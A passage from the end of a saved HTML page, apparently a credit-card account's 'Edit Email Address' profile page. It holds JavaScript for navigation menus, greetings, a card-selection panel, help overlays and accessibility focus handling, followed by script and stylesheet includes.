                YAHOO.util.Dom.removeClass(allNavDropdown, 'nav-open');
                isnavOpen ? closeNavMenu(navParentContainer) : openNavMenu(navParentContainer);
            });

            YAHOO.util.Event.on(navbarDropdown, "keyup", function (e) {
                var navParentContainer = this.parentElement;
                if (e.keyCode === 27) {
                    closeNavMenu(navParentContainer);
                }

            });

            YAHOO.util.Event.addListener(document, "click", function (e) {
                var el = YAHOO.util.Event.getTarget(e);
                var keyEl = YAHOO.util.Dom.get("b-primary-nav-links");
                if (el != keyEl && !YAHOO.util.Dom.isAncestor(keyEl, el)) {
                    YAHOO.util.Dom.removeClass(allNavDropdown, 'nav-open');
                    removeTabFromAnchors(keyEl);
                }
            });

            var allNavDropdownLinks = YAHOO.util.Selector.query(".b-dropdown-grid-container a");
            YAHOO.util.Event.on(allNavDropdownLinks, "click", function () {
                YAHOO.util.Dom.removeClass(allNavDropdown, 'nav-open');
            });

            //below code is to close the menu when the focus moves out of submenu container
            var submenu = YAHOO.util.Selector.query(".b-primary-nav  .dropdown-menu.menu a");
            for (var k = 0; k < submenu.length; k++) {

                submenu[k].addEventListener('blur', onMenuLinkFocusOut); //added for firefox
                submenu[k].addEventListener('focusout', onMenuLinkFocusOut);

                removeTabFromAnchors(findAncestor(submenu[k], 'dropdown-menu'));
            }

            //below code is to close menu when 'shift+tab' is pressed just after opening the menu
            var navLinks = YAHOO.util.Selector.query('.b-primary-nav [data-toggle="dropdown"]');

            for (var k = 0; k < navLinks.length; k++) {
                navLinks[k].addEventListener('blur', onMenuFocusOut); //added for firefox
                navLinks[k].addEventListener('focusout', onMenuFocusOut);
            }

        }

        var setUpSalutation = function (defaultSalutation) {
            if (defaultSalutation == "") {
                var salutationContainer = YAHOO.util.Dom.get("greeting-salutation");
                var salutationMorning = "Good morning";
                var salutationAfternoon = "Good afternoon";
                var salutationEvening = "Good evening";
                var salutationStandard = "Welcome";
                var current_date = new Date(),
                    current_hour = current_date.getHours();

                if (current_hour >= 17) {
                    salutationContainer.innerHTML = salutationEvening;
                } else if (current_hour >= 12) {
                    salutationContainer.innerHTML = salutationAfternoon;
                } else if (current_hour >= 5) {
                    salutationContainer.innerHTML = salutationMorning;
                } else {
                    salutationContainer.innerHTML = salutationStandard;
                }
            }
        }

        var setUpMultiCardSelection = function () {
            var multiCard_view_all_link = YAHOO.util.Dom.get("b-view-all-cards");
            var multiCard_close_link = YAHOO.util.Dom.get("b-close-multicard");
            var multiCard_container = YAHOO.util.Dom.get("b-multi-card-container");

            var _openMultiCardSelection = function () {
                YAHOO.util.Dom.removeClass(multiCard_container, 'hidden');
                YAHOO.util.Dom.removeClass(multiCard_container, 'ada-hidden');
                //adding timeout to preserve animation
                setTimeout(function () {
                    YAHOO.util.Dom.removeClass(multiCard_container, 'b-multi-card-hide');
                }, 1);
                multiCard_view_all_link.setAttribute('aria-expanded', true);
            }
            var _closeMultiCardSelection = function () {
                YAHOO.util.Dom.addClass(multiCard_container, 'b-multi-card-hide');
                //adding timeout to preserve animation
                setTimeout(function () {
                    YAHOO.util.Dom.addClass(multiCard_container, 'ada-hidden');
                }, 500);
                multiCard_view_all_link.setAttribute('aria-expanded', false);
            }
            var _closeMultiCardAndFocusViewAllLink = function () {
                _closeMultiCardSelection();
                multiCard_view_all_link.focus();
            }
            var _closeMultiCardOnFocusOut = function (e) {
                var related_target = YAHOO.util.Dom.get(e.relatedTarget);
                if (!YAHOO.util.Dom.isAncestor(multiCard_container, related_target)) {
                    _closeMultiCardSelection();
                }
            }
            YAHOO.util.Event.on(multiCard_view_all_link, "click", function () {
                if (YAHOO.util.Dom.hasClass(multiCard_container, 'b-multi-card-hide')) {
                    _openMultiCardSelection();
                } else {
                    _closeMultiCardSelection();
                }
            });
            YAHOO.util.Event.on(multiCard_close_link, "click", function () {
                _closeMultiCardAndFocusViewAllLink();
            });
            YAHOO.util.Event.on(multiCard_view_all_link, "keyup", function (e) {
                if (e.keyCode == 27) {
                    _closeMultiCardSelection();
                }
            });
            YAHOO.util.Event.on(multiCard_container, "keyup", function (e) {
                if (e.keyCode == 27) {
                    _closeMultiCardAndFocusViewAllLink();
                }
            });
            YAHOO.util.Event.on(multiCard_container, "keydown", function (e) {
                if (e.keyCode === 9) {
                    YAHOO.util.Event.addListener(multiCard_container, "focusout", function (evt) {
                        _closeMultiCardOnFocusOut(evt);
                        YAHOO.util.Event.removeListener(multiCard_container, "focusout");
                    });
                }
            });
            YAHOO.util.Event.on(multiCard_view_all_link, "keydown", function (e) {
                if (e.keyCode === 9) {
                    YAHOO.util.Event.addListener(multiCard_view_all_link, "focusout", function (evt) {
                        _closeMultiCardOnFocusOut(evt);
                        YAHOO.util.Event.removeListener(multiCard_view_all_link, "focusout");
                    });
                }

            });
        }







        var templatePageButtons = function () {
            if (YAHOO.util.Dom.get("searchButton")) {
                var searchButton = new YAHOO.widget.Button("searchButton");
                YAHOO.util.Dom.addClass(searchButton, "green");
            };
        }


        YAHOO.util.Event.onContentReady("ft", templatePageButtons);

        YAHOO.util.Event.onDOMReady(function () {
            YAHOO.util.Event.on(YAHOO.util.Dom.getElementsByClassName("homeLinkAnchor"), "click", function () {
                s.tl(this, 'o', 'HomeLink');
            });
        });


        YUI().use("bcusPanel", function (Y) {

            if (Y.one("#mainNavHelp")) {
                Y.one('#mainNavHelp').once("click", function (e) {
                    e.preventDefault();
                    Y.BCUSPanel.initPanel({
                        eventObj: e,
                        width: 310,
                        srcNode: "#helpOverlay",
                        align: {
                            node: "#mainNavHelp",
                            points: [Y.WidgetPositionAlign.TR, Y.WidgetPositionAlign.BR]
                        },
                        alignAdjust: [32, 2],
                        trigger: '#mainNavHelp',
                        onShowFunction: function () {
                            Y.one("#mainNavHelp").addClass("withLiner");
                            if (Y.one("#searchBox")) {
                                Y.one("#searchBox").focus();
                            };
                        },
                        onHideFunction: function () {
                            Y.one("#mainNavHelp").removeClass("withLiner");
                        }
                    });
                });
            }
        });

        var renderMainNavigationOverlay = function (overlay, linkSelector) {
            YAHOO.util.Event.on(linkSelector, "click", function (e) {
                YAHOO.util.Event.preventDefault(e);
                var overlayCoordinates;

                switch (linkSelector) {
                    case "topHomeLink":
                        overlayCoordinates = [-1, 5];
                        YAHOO.util.Dom.removeClass("mainNavHelp", "withLiner");
                        YAHOO.util.Dom.removeClass("mainNavHelp", "is-selected");
                        break;
                    case "mainNavHelp":
                        overlayCoordinates = [-218, 2];
                        YAHOO.util.Dom.removeClass("topHomeLink", "withLiner");
                        YAHOO.util.Dom.removeClass("topHomeLink", "is-selected");
                        break;
                    default:
                }

                //close overlay if open
                if (BCUS.mainNavigationPanel)
                    BCUS.mainNavigationPanel.hide();

                BCUS.mainNavigationPanel = new YAHOO.widget.Overlay(overlay, {
                    context: [linkSelector, "tl", "bl", ["beforeShow", "windowResize"], overlayCoordinates],
                    fixedcenter: false,
                    visible: true,
                    constraintoviewport: false,
                    draggable: false
                    //effect:{
                    //    effect:YAHOO.widget.ContainerEffect.FADE,
                    //    duration:0.25
                    //}
                });

                //BCUS.mainNavigationPanel.setHeader("");
                //BCUS.mainNavigationPanel.setBody(errorHTML + msg);
                //BCUS.mainNavigationPanel.render(document.body);
                //YAHOO.util.Dom.addClass(fieldErrorPanel, "error");
                BCUS.mainNavigationPanel.align("tl", "bl");
                //BCUS.mainNavigationPanel.hide();

                BCUS.mainNavigationPanel.show();
                //unhide overlay if hidden
                if (YAHOO.util.Dom.hasClass(overlay, "hide")) {
                    YAHOO.util.Dom.removeClass(overlay, "hide");
                    BCUS.mainNavigationPanel.align("tl", "bl");
                }

                //add tab to selector
                YAHOO.util.Dom.addClass(linkSelector, "withLiner");

                if (linkSelector == "mainNavHelp") {
                    if (Dom.hasClass("mainNavHelpIcon", "searchIcon")) {
                        YAHOO.util.Dom.removeClass("mainNavHelpIcon", "searchIcon");
                        YAHOO.util.Dom.addClass("mainNavHelpIcon", "searchIconOn");
                        YAHOO.util.Dom.addClass("mainNavHelp", "activePage");
                        YAHOO.util.Dom.addClass("mainNavHelp", "is-selected");
                    }
                    YAHOO.util.Dom.get("searchBox").value = "";
                }
                else {
                    if (Dom.hasClass("mainNavHelpIcon", "searchIconOn")) {
                        YAHOO.util.Dom.removeClass("mainNavHelpIcon", "searchIconOn");
                        YAHOO.util.Dom.addClass("mainNavHelpIcon", "searchIcon");
                    }
                    YAHOO.util.Dom.addClass(linkSelector, "activePage");
                    YAHOO.util.Dom.addClass(linkSelector, "is-selected");
                }



                YAHOO.util.Event.on(document, "click", function (evt) {
                    var t = YAHOO.util.Event.getTarget(evt);
                    var helpLink = YAHOO.util.Dom.get("mainNavHelp");
                    var homeLink = YAHOO.util.Dom.get("topHomeLink");
                    var container = YAHOO.util.Dom.get("helpOverlay");
                    var searchIcon = YAHOO.util.Dom.get("mainNavHelpIcon");

                    //if(t == tab || YAHOO.util.Dom.isAncestor(tab, t) || t == container || YAHOO.util.Dom.isAncestor(container, t)){

                    if (t == helpLink || t == homeLink || t == container || YAHOO.util.Dom.isAncestor(container, t) || t == searchIcon) {
                        //return;
                    }
                    else {

                        YAHOO.util.Dom.removeClass(helpLink, "withLiner");
                        YAHOO.util.Dom.removeClass(homeLink, "withLiner");

                        YAHOO.util.Dom.addClass("helpOverlay", "hide");
                        YAHOO.util.Dom.addClass("topHomeLinkTab", "hide");

                        if (linkSelector == "mainNavHelp") {
                            if (Dom.hasClass("mainNavHelpIcon", "searchIconOn")) {
                                YAHOO.util.Dom.removeClass("mainNavHelpIcon", "searchIconOn");
                                YAHOO.util.Dom.addClass("mainNavHelpIcon", "searchIcon");
                            }
                            YAHOO.util.Dom.get("searchBox").value = "";
                        }
                        YAHOO.util.Dom.removeClass(linkSelector, "activePage");
                        YAHOO.util.Dom.removeClass(linkSelector, "is-selected");
                    }
                });

            });
        }


    </script>


    <script src="./Profile - Edit Email Address_files/flying-focus.js.download"></script>

    <script type="text/javascript">

        var elementsWithTabindex = document.getElementById("yui-main").querySelectorAll('[tabindex]');
        for (var i = 0; i < elementsWithTabindex.length; i++) {
            if (elementsWithTabindex[i].getAttribute("tabindex") > 0) {
                elementsWithTabindex[i].removeAttribute("tabindex");
            }
        }

    </script>

    <!-- profile | email | editEmail -->

    <!--  : displayVASReenroll-->
    <!--  : displayVASReenrollModal -->





    <link rel="stylesheet" media="print" href="./Profile - Edit Email Address_files/print.css">






    <script>
        var logo_data;
        logo_data = {
            'url': 'https://gif.barclaycardus.com/servicing/a934f5d4/img/base/header-logo.svg',
            'alt': 'Credit Card Logo',
            'compactLogoUrl': ''
        };
    </script>



    <script src="./Profile - Edit Email Address_files/common.vendor.js.download"></script>
    <script src="./Profile - Edit Email Address_files/react.vendor.js.download"></script>
    <script src="./Profile - Edit Email Address_files/app.logoComponent.js.download"></script>

    <!-- Version:  -->


</body>

</html>